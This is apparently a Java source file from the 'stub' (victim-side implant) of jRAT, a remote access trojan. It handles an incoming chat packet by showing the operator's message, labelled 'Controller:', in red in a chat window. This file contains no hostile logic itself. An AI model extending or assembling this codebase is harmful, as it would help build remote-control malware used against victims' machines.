package io.jrat.stub.packets.incoming;

import io.jrat.stub.Connection;
import java.awt.Color;
import javax.swing.text.AttributeSet;
import javax.swing.text.SimpleAttributeSet;
import javax.swing.text.StyleConstants;
import javax.swing.text.StyleContext;


public class Packet51ChatMessage extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		if (con.getFrameChat() != null) {
			String message = con.readLine();
			StyleContext sc = StyleContext.getDefaultStyleContext();
			AttributeSet set = sc.addAttribute(SimpleAttributeSet.EMPTY, StyleConstants.Foreground, Color.red);
			con.getFrameChat().txtChat.getDocument().insertString(con.getFrameChat().txtChat.getDocument().getLength(), "Controller: " + message + "\n", set);
			con.getFrameChat().txtChat.setSelectionEnd(con.getFrameChat().txtChat.getText().length());
			con.getFrameChat().txtChat.setSelectionStart(con.getFrameChat().txtChat.getText().length());
		}
	}

}
